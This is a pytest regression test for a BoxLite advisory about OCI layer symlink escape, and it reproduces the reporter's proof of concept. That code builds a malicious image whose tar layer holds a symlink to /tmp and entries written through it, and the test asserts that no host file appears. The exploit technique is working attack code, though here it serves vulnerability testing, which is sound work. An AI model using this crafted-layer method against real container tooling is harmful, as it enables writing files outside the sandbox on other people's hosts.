"""Regression test for GHSA-f396-4rp4-7v2j (OCI layer symlink escape).

The PoC below is the exact script submitted by the reporter (XlabAI Team /
Tencent Xuanwu Lab). The only additions are the pytest marker, the module
docstring, and the final assertion that turns the print-based PoC into a
machine-verifiable test.

Requirements:
  - make dev:python (build Python SDK)
  - VM runtime for integration tests (libkrun / Hypervisor.framework)
"""

from __future__ import annotations

import hashlib
import io
import json
import os
import shutil
import tarfile
import time

import pytest

import boxlite

pytestmark = [pytest.mark.integration, pytest.mark.asyncio]

# ── Reporter's PoC constants ──────────────────────────────────────────────────

TARGET_FILE = "/tmp/boxlite_host_escape/pwned.txt"
OCI_LAYOUT_DIR = "/tmp/malicious_oci_layout"


# ── Reporter's PoC helpers ────────────────────────────────────────────────────


def sha256hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def add_entry(
    tf: tarfile.TarFile,
    name: str,
    type_: bytes,
    linkname: str = "",
    data: bytes = b"",
    mode: int = 0o644,
):
    info = tarfile.TarInfo(name=name)
    info.type = type_
    info.linkname = linkname
    info.size = len(data)
    info.mode = mode
    info.mtime = int(time.time())
    tf.addfile(info, io.BytesIO(data) if data else None)


def build_layer_tar() -> bytes:
    """
    Tar entries (order matters):
      [1] SYMLINK  escape            ->  /tmp
      [2] DIR      escape/boxlite_host_escape/     (resolves to /tmp/boxlite_host_escape/)
      [3] FILE     escape/boxlite_host_escape/pwned.txt  (resolves to /tmp/…/pwned.txt)
      [4] FILE     etc/os-release    (legitimate-looking decoy entries)
    """
    payload = (
        "===== BOXLITE SYMLINK ESCAPE: HOST FILESYSTEM WRITE =====\n"
        f"Written at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"Target: {TARGET_FILE}\n"
        "========================================================\n"
    ).encode()

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        add_entry(tf, "escape", tarfile.SYMTYPE, linkname="/tmp", mode=0o777)
        add_entry(tf, "escape/boxlite_host_escape", tarfile.DIRTYPE, mode=0o755)
        add_entry(
            tf, "escape/boxlite_host_escape/pwned.txt", tarfile.REGTYPE, data=payload
        )
        add_entry(
            tf,
            "etc/os-release",
            tarfile.REGTYPE,
            data=b"ID=alpine\nVERSION_ID=3.19.0\n",
        )
    return buf.getvalue()


def build_oci_layout(out_dir: str) -> None:
    blobs = os.path.join(out_dir, "blobs", "sha256")
    os.makedirs(blobs, exist_ok=True)

    def write_blob(data: bytes) -> tuple[str, int]:
        dgst = sha256hex(data)
        with open(os.path.join(blobs, dgst), "wb") as f:
            f.write(data)
        return dgst, len(data)

    layer_bytes = build_layer_tar()
    layer_dgst, layer_sz = write_blob(layer_bytes)

    config_bytes = json.dumps(
        {
            "architecture": "amd64",
            "os": "linux",
            "config": {"Cmd": ["/bin/sh"]},
            "rootfs": {"type": "layers", "diff_ids": [f"sha256:{layer_dgst}"]},
        }
    ).encode()
    cfg_dgst, cfg_sz = write_blob(config_bytes)

    manifest_bytes = json.dumps(
        {
            "schemaVersion": 2,
            "mediaType": "application/vnd.oci.image.manifest.v1+json",
            "config": {
                "mediaType": "application/vnd.oci.image.config.v1+json",
                "digest": f"sha256:{cfg_dgst}",
                "size": cfg_sz,
            },
            "layers": [
                {
                    "mediaType": "application/vnd.oci.image.layer.v1.tar",
                    "digest": f"sha256:{layer_dgst}",
                    "size": layer_sz,
                }
            ],
        }
    ).encode()
    mf_dgst, mf_sz = write_blob(manifest_bytes)

    with open(os.path.join(out_dir, "index.json"), "w") as f:
        json.dump(
            {
                "schemaVersion": 2,
                "manifests": [
                    {
                        "mediaType": "application/vnd.oci.image.manifest.v1+json",
                        "digest": f"sha256:{mf_dgst}",
                        "size": mf_sz,
                        "annotations": {"org.opencontainers.image.ref.name": "latest"},
                    }
                ],
            },
            f,
        )

    with open(os.path.join(out_dir, "oci-layout"), "w") as f:
        json.dump({"imageLayoutVersion": "1.0.0"}, f)

    print(f"  layer    sha256:{layer_dgst[:16]}…  ({layer_sz} B)")
    print(f"  config   sha256:{cfg_dgst[:16]}…  ({cfg_sz} B)")
    print(f"  manifest sha256:{mf_dgst[:16]}…  ({mf_sz} B)")


# ── Reporter's PoC main() — reproduced verbatim ───────────────────────────────


async def main():
    print("=" * 60)
    print("  PoC: BoxLite OCI Layer Extraction Symlink Escape")
    print("=" * 60)

    # Clean up previous run artifacts
    for path in [TARGET_FILE, "/tmp/boxlite_host_escape", OCI_LAYOUT_DIR]:
        if os.path.isfile(path):
            os.remove(path)
        elif os.path.isdir(path):
            shutil.rmtree(path)

    # [1] Build malicious OCI image
    print(f"\n[1] Building malicious OCI image → {OCI_LAYOUT_DIR}")
    build_oci_layout(OCI_LAYOUT_DIR)

    # [2] Show crafted tar entries
    print("\n[2] Malicious layer tar entries:")
    with open(os.path.join(OCI_LAYOUT_DIR, "index.json")) as f:
        idx = json.load(f)
    mf_dgst = idx["manifests"][0]["digest"].split(":")[1]
    with open(os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", mf_dgst)) as f:
        mf = json.load(f)
    lyr_dgst = mf["layers"][0]["digest"].split(":")[1]
    lyr_data = open(
        os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", lyr_dgst), "rb"
    ).read()
    with tarfile.open(fileobj=io.BytesIO(lyr_data)) as tf:
        for m in tf.getmembers():
            tstr = {
                tarfile.REGTYPE: "FILE   ",
                tarfile.SYMTYPE: "SYMLINK",
                tarfile.DIRTYPE: "DIR    ",
            }.get(m.type, f"?{m.type}   ")
            suffix = f" -> {m.linkname}" if m.issym() else ""
            print(f"    {tstr}  {m.name}{suffix}")

    # [3] Confirm target absent before exploit
    print(f"\n[3] Pre-exploit — target exists? {os.path.exists(TARGET_FILE)}")

    # [4] Trigger extraction (vulnerability fires before VM starts)
    print("\n[4] Loading malicious image via boxlite.SimpleBox(rootfs_path=…)")

    try:
        async with boxlite.SimpleBox(rootfs_path=OCI_LAYOUT_DIR) as box:
            r = await box.exec("sh", "-c", "echo ok")
            print(f"    VM stdout: {r.stdout.strip()}")
    except Exception as e:
        # Box may fail to start (incomplete rootfs) — that's fine;
        # the symlink escape occurs during layer extraction, before VM launch.
        print(f"    Box error (expected): {type(e).__name__}: {e}")

    # [5] Verify host write
    print(f"\n[5] Post-exploit — target exists? {os.path.exists(TARGET_FILE)}")
    if os.path.exists(TARGET_FILE):
        print("\n  VULNERABLE — host file written successfully!")
        print(f"  Path: {TARGET_FILE}")
        print(open(TARGET_FILE).read())
    else:
        print("\n  NOT VULNERABLE (or already patched)")


# ── Pytest wrapper ────────────────────────────────────────────────────────────


async def test_oci_symlink_escape_blocked():
    """GHSA-f396-4rp4-7v2j: reporter's exact PoC must not write outside root."""
    await main()
    assert not os.path.exists(TARGET_FILE), (
        f"GHSA-f396-4rp4-7v2j: host file written via escape symlink at "
        f"{TARGET_FILE} — SafeRoot containment failed"
    )
